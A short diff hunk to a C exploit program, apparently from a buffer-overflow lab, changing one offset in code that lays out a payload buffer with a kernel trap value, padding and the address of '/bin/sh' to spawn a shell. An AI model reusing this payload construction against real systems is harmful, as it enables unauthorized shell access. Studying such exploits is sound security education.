@@ -49,7 +49,7 @@ int main(void)
   // trap into kernel
   strcpy(bufr + 163, trap); // 0xbba9b6e5
   // leave 4 bytes for the ret call of trap
-  strcpy(bufr + 168, "\x01\x01\x01\x01");
+  strcpy(bufr + 167, "\x01\x01\x01\x01");
   // address of "/bin/sh"
   strcpy(bufr + 171, shell_addr);
   // address of prev arg
